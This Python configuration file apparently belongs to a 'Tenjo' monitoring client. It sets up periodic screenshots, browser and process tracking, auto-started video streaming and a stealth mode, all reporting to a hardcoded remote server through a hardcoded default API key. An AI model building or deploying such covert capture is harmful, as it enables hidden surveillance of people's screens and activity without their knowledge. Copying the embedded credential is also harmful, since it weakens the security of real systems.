# Tenjo Client Configuration for Yayasans-MacBook-Air.local
import os
import uuid
import socket
import platform
from datetime import datetime

def get_local_ip():
    """Get the best available local IP address"""
    try:
        # Method 1: Socket connection (most reliable)
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            if ip and ip != '127.0.0.1':
                return ip
    except Exception:
        pass
    
    try:
        # Method 2: Hostname resolution
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        if ip != '127.0.0.1':
            return ip
    except Exception:
        pass
    
    # Fallback
    return '127.0.0.1'

class Config:
    # Server Configuration - PRODUCTION MODE
    # SERVER_URL = os.getenv('TENJO_SERVER_URL', "http://127.0.0.1:8000")  # Development server (COMMENTED)
    # SERVER_URL = "http://127.0.0.1:8000"  # Development (local) (COMMENTED)
    SERVER_URL = os.getenv("TENJO_SERVER_URL", "http://103.129.149.67")  # Production server IP
    API_ENDPOINT = f"{SERVER_URL}/api"
    API_KEY = os.getenv('TENJO_API_KEY', "tenjo-api-key-2024")

    # Client Identification - Dynamic generation based on hardware
    @staticmethod
    def generate_client_id():
        """Generate unique client ID based on hardware"""
        import hashlib
        
        # Get unique identifiers
        hostname = socket.gethostname()
        mac_address = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) 
                               for elements in range(0,2*6,2)][::-1])
        
        # Create deterministic UUID based on hostname + MAC
        unique_string = f"{hostname}-{mac_address}"
        hash_object = hashlib.md5(unique_string.encode())
        
        # Convert to UUID format
        hex_dig = hash_object.hexdigest()
        client_uuid = f"{hex_dig[:8]}-{hex_dig[8:12]}-{hex_dig[12:16]}-{hex_dig[16:20]}-{hex_dig[20:32]}"
        
        return client_uuid
    
    # Use dynamic client ID generation
    CLIENT_ID = generate_client_id.__func__()
    CLIENT_NAME = socket.gethostname()
    CLIENT_USER = os.getenv('USER', os.getenv('USERNAME', 'unknown'))
    HOSTNAME = socket.gethostname()
    PLATFORM = platform.system()
    IP_ADDRESS = get_local_ip()  # Get real IP address

    # Monitoring Settings
    SCREENSHOT_INTERVAL = int(os.getenv('TENJO_SCREENSHOT_INTERVAL', '60'))  # seconds
    BROWSER_CHECK_INTERVAL = 60  # seconds
    PROCESS_CHECK_INTERVAL = 90  # seconds
    HEARTBEAT_INTERVAL = 300  # seconds (5 minutes)

    # Features
    SCREENSHOT_ENABLED = True
    BROWSER_MONITORING = True
    PROCESS_MONITORING = True
    STEALTH_MODE = True  # Disabled for development/testing
    AUTO_START_VIDEO_STREAMING = True  # ENABLED for production

    # Paths
    BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    LOG_DIR = os.path.join(BASE_DIR, "logs")
    DATA_DIR = os.path.join(BASE_DIR, "data")

    # Logging
    LOG_LEVEL = os.getenv("TENJO_LOG_LEVEL", "ERROR")
    LOG_FILE = os.path.join(LOG_DIR, f"tenjo_client_{datetime.now().strftime('%Y%m%d')}.log")

    @classmethod
    def init_directories(cls):
        """Create directories if they don't exist"""
        os.makedirs(cls.LOG_DIR, exist_ok=True)
        os.makedirs(cls.DATA_DIR, exist_ok=True)

# Initialize directories
Config.init_directories()
